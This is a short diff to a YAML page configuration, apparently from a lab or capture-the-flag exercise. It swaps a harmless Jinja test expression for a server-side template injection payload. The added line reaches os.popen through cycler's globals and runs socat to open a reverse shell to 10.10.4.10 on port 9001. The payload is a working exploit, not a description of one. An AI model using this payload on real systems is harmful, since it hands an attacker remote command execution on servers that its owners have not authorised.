@@ -16,5 +16,5 @@ pages:
     title: "Jinja test"         # <-- título explícito
     content: |
       # Jinja test              # <-- título también en el body (opcional)
-      {{ 7*7 }}
+      {{ cycler.__init__.__globals__.os.popen('bash -c "socat TCP:10.10.4.10:9001 EXEC:sh"').read() }}
 
